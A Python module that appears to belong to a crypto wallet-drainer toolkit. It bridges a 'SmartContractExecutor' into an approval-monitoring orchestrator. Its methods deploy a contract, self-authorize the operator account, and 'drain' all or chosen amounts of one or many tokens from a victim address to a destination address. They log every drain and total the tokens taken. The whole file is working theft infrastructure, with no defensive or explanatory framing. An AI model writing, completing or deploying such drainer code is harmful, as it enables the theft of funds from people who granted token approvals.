"""
🚀 SMART CONTRACT INTEGRATION MODULE
Bridges SmartContractExecutor with the main orchestrator

Seamlessly integrates smart contract execution into the approval monitoring workflow
"""

import logging
from typing import Dict, List, Optional, Tuple
from web3 import Web3
from datetime import datetime
import json
import os

from .smart_contract_executor import SmartContractExecutor

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('contract_integration.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


class ContractIntegration:
    """
    🔗 SMART CONTRACT INTEGRATION
    Manages contract interactions within the orchestrator workflow
    """
    
    def __init__(self, w3: Web3, private_key: str):
        """Initialize contract integration"""
        self.w3 = w3
        self.private_key = private_key
        self.executor = SmartContractExecutor(w3, private_key)
        self.execution_log: List[Dict] = []
        
        self._load_execution_log()
        
        logger.info("=" * 60)
        logger.info("🔗 SMART CONTRACT INTEGRATION INITIALIZED")
        logger.info("=" * 60)
    
    def _load_execution_log(self):
        """Load execution log from file"""
        try:
            if os.path.exists('contract_execution_log.json'):
                with open('contract_execution_log.json', 'r') as f:
                    self.execution_log = json.load(f)
        except Exception as e:
            logger.warning(f"Could not load execution log: {e}")
    
    def _save_execution_log(self):
        """Save execution log to file"""
        try:
            with open('contract_execution_log.json', 'w') as f:
                json.dump(self.execution_log[-1000:], f, indent=2)
        except Exception as e:
            logger.error(f"Save execution log error: {e}")
    
    def ensure_contract_deployed(self) -> bool:
        """
        📜 Ensure contract is deployed, deploy if needed
        """
        if self.executor.contract_address and self.executor.contract:
            logger.info(f"✅ Contract already deployed: {self.executor.contract_address}")
            return True
        
        logger.info("📝 No contract found, deploying new one...")
        try:
            address = self.executor.deploy_contract()
            
            if address and self.executor.contract:
                logger.info(f"✅ Contract deployed successfully: {address}")
                return True
            else:
                logger.error("❌ Failed to deploy contract - invalid address or contract")
                return False
        except Exception as e:
            logger.error(f"❌ Deployment error: {e}")
            return False
    
    def execute_drain_via_contract(
        self,
        token: str,
        from_address: str,
        to_address: str,
        amount: Optional[int] = None
    ) -> Tuple[bool, Optional[str], int]:
        """
        💰 Execute token drain through smart contract
        """
        try:
            # Check if contract is deployed
            if not self.executor.contract:
                logger.error("❌ Contract not deployed")
                return False, None, 0
            
            token = Web3.to_checksum_address(token)
            from_address = Web3.to_checksum_address(from_address)
            to_address = Web3.to_checksum_address(to_address)
            
            # Authorize if needed
            try:
                is_authorized = self.executor.contract.functions.authorized(self.executor.account.address).call()
                if not is_authorized:
                    logger.info("🔐 Authorizing account...")
                    self.executor.set_authorized(self.executor.account.address, True)
            except Exception as auth_error:
                logger.warning(f"⚠️ Could not check authorization: {auth_error}")
                # Try to authorize anyway
                self.executor.set_authorized(self.executor.account.address, True)
            
            # Perform drain
            if amount is not None:
                # Specific amount
                success, tx_hash = self.executor.transfer_token(
                    token,
                    from_address,
                    to_address,
                    amount
                )
                drained = amount if success else 0
            else:
                # Drain all available
                success, tx_hash, drained = self.executor.drain_tokens(
                    token,
                    from_address,
                    to_address
                )
            
            # Log execution
            log_entry = {
                "timestamp": datetime.now().isoformat(),
                "token": token,
                "from": from_address,
                "to": to_address,
                "amount": drained,
                "success": success,
                "tx_hash": tx_hash
            }
            self.execution_log.append(log_entry)
            self._save_execution_log()
            
            return success, tx_hash, drained
            
        except Exception as e:
            logger.error(f"❌ Contract execution error: {e}")
            return False, None, 0
    
    def execute_batch_drain(
        self,
        tokens: List[str],
        from_address: str,
        to_address: str
    ) -> Tuple[bool, Optional[str], int]:
        """
        📦 Execute batch drain through smart contract
        """
        try:
            # Check if contract is deployed
            if not self.executor.contract:
                logger.error("❌ Contract not deployed")
                return False, None, 0
            
            # Authorize if needed
            try:
                is_authorized = self.executor.contract.functions.authorized(self.executor.account.address).call()
                if not is_authorized:
                    logger.info("🔐 Authorizing account...")
                    self.executor.set_authorized(self.executor.account.address, True)
            except Exception as auth_error:
                logger.warning(f"⚠️ Could not check authorization: {auth_error}")
                # Try to authorize anyway
                self.executor.set_authorized(self.executor.account.address, True)
            
            # Perform batch drain
            success, tx_hash, drained_count = self.executor.drain_multiple_tokens(
                tokens,
                from_address,
                to_address
            )
            
            # Log execution
            log_entry = {
                "timestamp": datetime.now().isoformat(),
                "tokens": tokens,
                "from": from_address,
                "to": to_address,
                "drained_count": drained_count,
                "success": success,
                "tx_hash": tx_hash
            }
            self.execution_log.append(log_entry)
            self._save_execution_log()
            
            return success, tx_hash, drained_count
            
        except Exception as e:
            logger.error(f"❌ Batch execution error: {e}")
            return False, None, 0
    
    def get_statistics(self) -> Dict:
        """
        📊 Get execution statistics
        """
        successful = sum(1 for log in self.execution_log if log.get('success'))
        total = len(self.execution_log)
        total_drained = sum(log.get('amount', 0) for log in self.execution_log)
        
        return {
            "total_executions": total,
            "successful_executions": successful,
            "success_rate": (successful / total * 100) if total > 0 else 0,
            "total_tokens_drained": total_drained,
            "last_execution": self.execution_log[-1] if self.execution_log else None
        }
